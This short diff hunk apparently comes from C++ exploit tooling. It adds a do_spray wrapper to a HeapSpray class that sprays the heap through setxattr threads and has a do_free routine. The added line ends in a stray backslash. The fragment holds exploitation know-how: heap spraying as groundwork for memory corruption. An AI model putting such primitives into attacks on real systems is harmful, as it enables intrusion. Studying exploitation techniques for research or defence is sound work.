@@ -172,6 +172,11 @@ void *HeapSpray::spray(void* arg) {
           pthread_create(&thr, NULL, spray_setxattr, (void *) setxattr_arg);
 }
 
+void HeapSpray::do_spray(int round, int shade) {
+    fork_and_spray(round, 1, shade, 1); \
+    sleep(1);
+}
+
 void HeapSpray::do_free(u_int64_t val) {
     if (val < 512) {
         u_int64_t id = val;
